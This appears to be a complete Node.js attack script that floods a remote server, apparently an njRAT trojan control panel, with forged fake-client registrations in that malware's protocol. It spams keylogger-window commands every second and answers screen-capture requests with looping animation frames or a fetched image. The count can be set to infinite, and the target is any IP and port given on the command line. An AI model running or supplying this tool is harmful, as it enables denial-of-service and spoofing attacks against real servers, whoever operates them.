const log = require('./log.js');
var net = require('net');
var fs = require('fs');
const btoa = require('btoa');
const https = require('https');

if (process.argv.length < 7 || process.argv.length > 8) {
  log.info("Can't attack please make sure to execute: node app.js ip:port count delay mode ex node app.js 192.233.122.21:1177 100 15 config ricardao true, mode could be either config or random, count could be infinite string. CAP can be ricardao for the ricardo milos dance, or an URL, klspam can be true or false spams keylogger with windows.");
  process.exit(0);
}

var config = require('./config.json');
var rndconfig = require('./config_random.json');
var ip = process.argv[2].split(':')[0];
var port = process.argv[2].split(':')[1];
let i = 0;
let countval = 0;

function choose(choices) {
  var index = Math.floor(Math.random() * choices.length);
  return choices[index];
}

function validateUrl(value) {
  return /^(?:(?:(?:https?|ftp):)?\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})))(?::\d{2,5})?(?:[/?#]\S*)?$/i.test(value);
}

function getImage(url, callback) {
  https.get(url, res => {
    const bufs = [];
    res.on('data', function (chunk) {
      bufs.push(chunk);
    });
    res.on('end', function () {
      const data = Buffer.concat(bufs);
      callback(null, data);
    });
  }).on('error', callback);
}


function formatCMD(cmd) {
  if (cmd.file) {
    const commandBuffer = Buffer.concat([Buffer.from(`${cmd.name}|'|'|`, 'utf8'), cmd.file]);
    const packetsize = commandBuffer.length;
    return Buffer.concat([Buffer.from(`${packetsize}\x00`), commandBuffer]);
  }
  const cmdstring = `${cmd.name}|'|'|${cmd.params.join("|'|'|")}`
  const packetsize = cmdstring.length;
  return Buffer.from(`${packetsize}\x00${cmdstring}`, 'utf8');
}

function delayedLoop() {
  if (process.argv[3] === "infinite") {
    countval = i + 1;
  } else {
    countval = process.argv[3];
  }
  if (i < countval) {
    i++;
    setTimeout(() => {
      createFakeClient();
      delayedLoop();
    }, process.argv[4]);
  }
}
delayedLoop();

function createFakeClient() {
  const socket = net.createConnection(port, ip, () => {
    switch (process.argv[5]) {
      case 'config':
        socket.write(formatCMD({
          name: 'll',
          params: [
            btoa(config.name),
            config.pc,
            config.user,
            config.install_date,
            '',
            config.os,
            config.cam,
            config.ver,
            '1ms',
            btoa(config.active_window),
            `fodase`
          ]
        }))
        break;
      case 'random':
        socket.write(formatCMD({
          name: 'll',
          params: [
            btoa(choose(rndconfig.names)),
            `${choose(rndconfig.usernames)}-PC`,
            choose(rndconfig.usernames),
            config.install_date,
            '',
            `${choose(["MacOS", "Linux", "Windows"])} ${choose(["XP", "7", "8", "8.1", "10"])} ${choose(["Home Premium", "Pro", "Professional", "Ultimate", "Enterprise"])} x69`,
            choose(["Yes", "No", "Maybe", "Talvez."]),
            choose(["0.0d", "0.1d", "0.2d", "0.3d", "0.4d", "0.5d", "0.6d", "0.7d", "0.8d", "0.9d", "0.10d"]),
            '1ms',
            btoa(choose(rndconfig.active_windows)),
            `fodase`
          ]
        }))
        break;
      default:
        log.error("Wrong Mode", "njattacker", "default");
        process.exit(0);
    }
    socket.write(formatCMD({
      name: 'inf',
      params: [
        btoa('fodase')
      ]
    }))
    if (process.argv[7] === 'true') {
      log.info("Opening Keylogger window.")
      setInterval(() => {
        socket.write(formatCMD({
          name: 'kl',
          params: [
            btoa(choose(rndconfig.names))
          ]
        }))
      }, 1000);
    }
    log.info(`(${i}) sending fake client on ${ip}:${port} mode ${process.argv[5]}`);
  });

  socket.on('error', (error) => {
    log.error("Connection was Closed Unexpectedly or was closed already, closing spammer. (GOT EM)", "njattacker", error);
    process.exit(0);
  });

  socket.on('close', () => {
    log.info(`socket closed unexpectedely (maybe client disconnected server?)`);
  })

  socket.on('data', (data) => {
    const dataS = data.toString();

    if (dataS === '0') {
      socket.write(Buffer.from('3000', 'hex'));
    }

    const msg = dataS.split('\x00')[1];
    const command = msg.split("|'|'|")[0];
    const args = msg.split("|'|'|");
    args.shift();

    if (!command || !args) return;

    log.debug(`Recieved ${args} complete message ${msg}`, command);
    switch (command) {
      case 'CAP':
        if (process.argv[6] && process.argv[6] === "ricardao") {
          const images = fs.readdirSync('frames').map(name => fs.readFileSync(`frames/${name}`))
          let iimg = 0
          setInterval(() => {
            const image = images[iimg];
            socket.write(formatCMD({
              name: 'CAP',
              file: image
            }));
            if (iimg < images.length - 1) {
              iimg++;
            } else {
              iimg = 0;
            }
          }, 100);
        } else if (validateUrl(process.argv[6])) {
          getImage(process.argv[6], function (err, data) {
            if (err) {
              log.error("idk", "njattacker", err);
            }
            return socket.write(formatCMD({
              name: 'CAP',
              file: data
            }))
          })
        } else {
          log.error("Couldn't validate URL for custom image", "njattacker", "none"); process.exit(0);
        }
        break;
    }
  })
}